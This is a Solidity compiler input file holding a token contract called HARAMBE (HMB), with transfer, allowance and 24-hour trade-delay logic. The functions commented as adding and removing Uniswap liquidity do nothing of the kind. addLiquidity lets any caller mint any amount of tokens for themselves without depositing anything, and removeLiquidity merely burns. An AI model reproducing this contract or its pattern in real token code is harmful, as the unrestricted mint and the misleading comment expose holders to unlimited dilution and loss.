{{
  "language": "Solidity",
  "sources": {
    "harambe.sol": {
      "content": "// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.0;\r\n\r\ncontract MyToken {\r\n    string public name;\r\n    string public symbol;\r\n    uint8 public decimals;\r\n    uint256 public totalSupply;\r\n\r\n    mapping(address => uint256) private balances;\r\n    mapping(address => mapping(address => uint256)) private allowed;\r\n    mapping(address => uint256) private lastTradeTime;\r\n\r\n    uint256 private tradeDelay = 24 hours;\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n\r\n    constructor() {\r\n        name = \"HARAMBE\";\r\n        symbol = \"HMB\";\r\n        decimals = 18;\r\n        totalSupply = 10000000000 * 10**uint256(decimals);\r\n        balances[msg.sender] = totalSupply;\r\n    }\r\n\r\n    function balanceOf(address owner) public view returns (uint256) {\r\n        return balances[owner];\r\n    }\r\n\r\n    function transfer(address to, uint256 value) public returns (bool) {\r\n        require(value <= balances[msg.sender], \"Insufficient balance\");\r\n        require(isTradeAllowed(msg.sender), \"Trade not allowed before delay\");\r\n\r\n        balances[msg.sender] -= value;\r\n        balances[to] += value;\r\n\r\n        lastTradeTime[msg.sender] = block.timestamp;\r\n\r\n        emit Transfer(msg.sender, to, value);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool) {\r\n        require(value <= balances[from], \"Insufficient balance\");\r\n        require(value <= allowed[from][msg.sender], \"Insufficient allowance\");\r\n        require(isTradeAllowed(from), \"Trade not allowed before delay\");\r\n\r\n        balances[from] -= value;\r\n        balances[to] += value;\r\n        allowed[from][msg.sender] -= value;\r\n\r\n        lastTradeTime[from] = block.timestamp;\r\n\r\n        emit Transfer(from, to, value);\r\n        return true;\r\n    }\r\n\r\n    function approve(address spender, uint256 value) public returns (bool) {\r\n        allowed[msg.sender][spender] = value;\r\n\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view returns (uint256) {\r\n        return allowed[owner][spender];\r\n    }\r\n\r\n    function isTradeAllowed(address account) internal view returns (bool) {\r\n        return lastTradeTime[account] + tradeDelay <= block.timestamp;\r\n    }\r\n\r\n    // Additional functions to add and remove liquidity from Uniswap\r\n\r\n    function addLiquidity(uint256 amount) external {\r\n        require(amount > 0, \"Amount must be greater than zero\");\r\n\r\n        balances[msg.sender] += amount;\r\n        totalSupply += amount;\r\n\r\n        emit Transfer(address(0), msg.sender, amount);\r\n    }\r\n\r\n    function removeLiquidity(uint256 amount) external {\r\n        require(amount > 0, \"Amount must be greater than zero\");\r\n        require(balances[msg.sender] >= amount, \"Insufficient balance\");\r\n\r\n        balances[msg.sender] -= amount;\r\n        totalSupply -= amount;\r\n\r\n        emit Transfer(msg.sender, address(0), amount);\r\n    }\r\n}\r\n"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}